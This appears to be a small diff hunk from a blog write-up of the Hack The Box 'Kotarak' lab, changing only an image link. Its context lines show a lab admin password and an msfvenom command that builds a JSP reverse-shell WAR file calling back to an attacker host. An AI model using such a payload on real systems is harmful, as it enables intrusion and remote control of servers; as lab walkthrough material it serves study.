@@ -49,7 +49,7 @@ admin : 3@g01PdhB!
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war
 ```
-![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png)
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png)
 
 ![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png)
 
